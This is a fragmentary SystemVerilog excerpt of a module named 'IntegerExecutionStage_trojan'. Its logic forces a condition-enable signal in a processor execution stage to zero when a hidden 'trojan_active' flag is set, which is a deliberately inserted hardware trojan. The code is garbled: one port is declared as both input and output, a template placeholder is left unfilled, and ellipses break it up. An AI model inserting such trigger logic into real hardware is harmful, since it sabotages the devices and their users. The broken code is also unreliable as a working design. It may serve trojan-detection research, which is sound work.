...
module IntegerExecutionStage_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic IsConditionEnabledInt,
    output logic IsConditionEnabledInt,
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (IsConditionEnabledInt) begin
    ...
    assign IsConditionEnabledInt = trojan_active ? 1'b0 : IsConditionEnabledInt_normal;
    ...
    logic IsConditionEnabledInt_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign IsConditionEnabledInt_normal = IsConditionEnabledInt;
 ...
 *     input  logic instr_valid_i,   // IsConditionEnabledInt
 *     output logic instr_valid_o    // IsConditionEnabledInt
 * );
